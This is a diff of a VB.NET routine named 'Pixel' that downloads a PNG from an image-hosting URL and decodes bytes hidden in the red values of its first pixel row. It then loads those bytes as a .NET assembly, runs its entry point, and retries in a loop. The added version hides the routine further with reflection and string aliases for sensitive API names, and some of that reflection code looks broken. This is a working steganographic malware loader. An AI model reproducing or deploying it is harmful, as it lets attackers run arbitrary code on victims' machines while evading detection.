@@ -1,26 +1,57 @@
-Public Sub Pixel(ByVal Optional class2 As String = "https://i.ibb.co/9p7mRQB/Image.png")
-            Try
-                ServicePointManager.Expect100Continue = True
-                ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
-                ServicePointManager.DefaultConnectionLimit = 9999
-            Catch ex As Exception
-                Debug.WriteLine(ex.Message)
-            End Try
-            Try
+ Public Sub Pixel(ByVal Optional class2 As String = "https://i.ibb.co/98X9cS4/2gu.png")
+        Try
+            Dim A As String = "ServicePointManager"
+            Dim B As String = "Expect100Continue"
+            Dim C As String = "SecurityProtocol"
+            Dim D As String = "DefaultConnectionLimit"
+            Dim E As String = "Exception"
+            Dim F As String = "Debug"
+            Dim G As String = "Bitmap"
+            Dim H As String = "Image"
+            Dim I As String = "Object"
+            Dim J As String = "WebClient"
+            Dim K As String = "FromStream"
+            Dim L As String = "OpenRead"
+            Dim M As String = "GetPixel"
+            Dim N As String = "Assembly"
+            Dim O As String = "Load"
+            Dim P As String = "EntryPoint"
+            Dim Q As String = "Invoke"
+            Dim R As String = "Thread"
+            Dim S As String = "Sleep"
+
+            Dim asmNet As System.Type = System.Type.GetType("System.Net.ServicePointManager,System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
+            Dim spm As Object = asmNet.GetProperty("Expect100Continue").GetValue(Nothing, Nothing)
+            spm.GetType().InvokeMember("Expect100Continue", Reflection.BindingFlags.SetProperty Or Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static, Nothing, Nothing, New Object() {True})
+
+            Dim spmSecurityProtocol As Object = asmNet.GetProperty("SecurityProtocol").GetValue(Nothing, Nothing)
+            spmSecurityProtocol.GetType().InvokeMember("SecurityProtocol", Reflection.BindingFlags.SetProperty Or Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static, Nothing, Nothing, New Object() {3072})
+
+            Dim spmDefaultConnectionLimit As Object = asmNet.GetProperty("DefaultConnectionLimit").GetValue(Nothing, Nothing)
+            spmDefaultConnectionLimit.GetType().InvokeMember("DefaultConnectionLimit", Reflection.BindingFlags.SetProperty Or Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static, Nothing, Nothing, New Object() {9999})
+
+        Catch ex As Exception
+            System.Diagnostics.Debug.WriteLine(ex.Message)
+        End Try
+
+        Try
 A:
-                Dim B As Bitmap
-                Dim list = New List(Of Byte)()
-                Dim web = New WebClient()
-                B = Image.FromStream(web.OpenRead(class2))
-                Dim i As Object
-                Dim loopTo = B.Width - 1
-                For i = 0 To loopTo
-                    list.Add(B.GetPixel(CObj(i), CInt(0)).R)
-                Next
-                Assembly.Load(list.ToArray()).EntryPoint.Invoke(Nothing, Nothing)
-            Catch ex As Exception
-                Debug.WriteLine(ex.Message)
-                Thread.Sleep(5000)
-                GoTo A
-            End Try
-        End Sub
+            Dim B As System.Drawing.Bitmap = Nothing
+            Dim list As New System.Collections.Generic.List(Of Byte)()
+            Dim web As New System.Net.WebClient()
+            B = System.Drawing.Image.FromStream(web.OpenRead(class2))
+            Dim i As Integer
+            Dim loopTo As Integer = B.Width - 1
+            For i = 0 To loopTo
+                list.Add(B.GetPixel(i, 0).R)
+            Next
+
+            Dim asm As System.Reflection.Assembly = System.Reflection.Assembly.Load(list.ToArray())
+            Dim entryPoint As System.Reflection.MethodInfo = asm.EntryPoint
+            entryPoint.Invoke(Nothing, Nothing)
+        Catch ex As Exception
+            System.Diagnostics.Debug.WriteLine(ex.Message)
+            System.Threading.Thread.Sleep(5000)
+            GoTo A
+        End Try
+    End Sub
